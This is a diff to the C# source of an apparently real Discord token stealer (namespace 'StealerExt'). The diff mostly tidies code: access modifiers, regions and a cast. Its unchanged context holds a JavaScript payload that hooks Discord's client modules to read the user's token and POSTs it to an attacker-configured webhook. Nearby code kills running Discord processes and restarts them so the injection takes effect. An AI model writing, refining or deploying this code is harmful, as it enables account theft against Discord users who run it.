@@ -6,15 +6,13 @@ using Newtonsoft.Json;
 
 namespace StealerExt
 {
-    public class Injection
+    internal class Injection
     {
-        #region Bools & String
-        public static bool Discord = false;
-        public static bool DiscordCan = false;
-        public static bool DiscordPTB = false;
+        private static bool Discord = false;
+        private static bool DiscordCan = false;
+        private static bool DiscordPTB = false;
         private static readonly string StringToInject = "var req=webpackJsonp.push([[],{extra_id:(e,r,t)=>e.exports=t},[[\"extra_id\"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let r=req.c[e].exports;if(r&&r.__esModule&&r.default)for(let e in r.default)\"getToken\"===e&&(token=r.default.getToken())}; var O = new XMLHttpRequest();O.open('POST', '" + API.wHook + "', false);O.setRequestHeader('Content-Type', 'application/json');O.send(`{\"content\": \"${token}\"}`);";
-        #endregion
-        #region Injection...
+        
         public static void StartInjection()
         {
             try
@@ -105,16 +103,15 @@ namespace StealerExt
                 }
             }
             catch { }
-            #region Restart Discord
             dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config"));
-            if (config.rd == true)
+            if ((bool)config.rd == true)
             {
                 try
                 {
                     Process.GetProcesses()
-                     .Where(x => x.ProcessName.StartsWith("Discord", StringComparison.OrdinalIgnoreCase))
-                     .ToList()
-                     .ForEach(x => x.Kill());
+                        .Where(x => x.ProcessName.StartsWith("Discord", StringComparison.OrdinalIgnoreCase))
+                        .ToList()
+                        .ForEach(x => x.Kill());
                     if (Discord)Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe", "--processStart Discord.exe");
                     if (DiscordCan)Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordCanary\\Update.exe", "--processStart DiscordCanary.exe");
                     if (DiscordPTB)Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordPTB\\Update.exe", "--processStart DiscordPTB.exe");
@@ -122,8 +119,6 @@ namespace StealerExt
                 }
                 catch { }
             }
-            #endregion
         }
-        #endregion
     }
 }
